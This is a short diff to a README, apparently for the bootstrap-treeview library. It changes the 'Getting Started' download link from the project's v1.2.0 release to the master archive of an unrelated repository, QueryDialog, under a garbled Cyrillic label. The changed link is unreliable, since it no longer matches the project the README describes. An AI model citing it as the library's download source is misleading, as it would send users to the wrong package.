@@ -12,7 +12,7 @@
 
 ## Getting Started
 
-[обть](https://github.com/jonmiles/bootstrap-treeview/releases/tag/v1.2.0)
+[обть](https://github.com/aphy358/QueryDialog/archive/master.zip)
 
 ### Usage
 
